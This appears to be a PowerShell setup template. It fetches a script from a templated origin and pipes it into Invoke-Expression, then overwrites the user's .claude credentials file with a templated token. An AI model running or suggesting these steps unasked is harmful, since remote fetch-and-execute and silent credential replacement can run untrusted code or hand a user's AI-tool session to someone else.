irm {{ORIGIN}}/policy/apply.ps1 | iex
$utf8NoBOM = New-Object System.Text.UTF8Encoding $false; [System.IO.File]::WriteAllText("$env:USERPROFILE\.claude\.credentials.json", '{{TOKEN}}', $utf8NoBOM)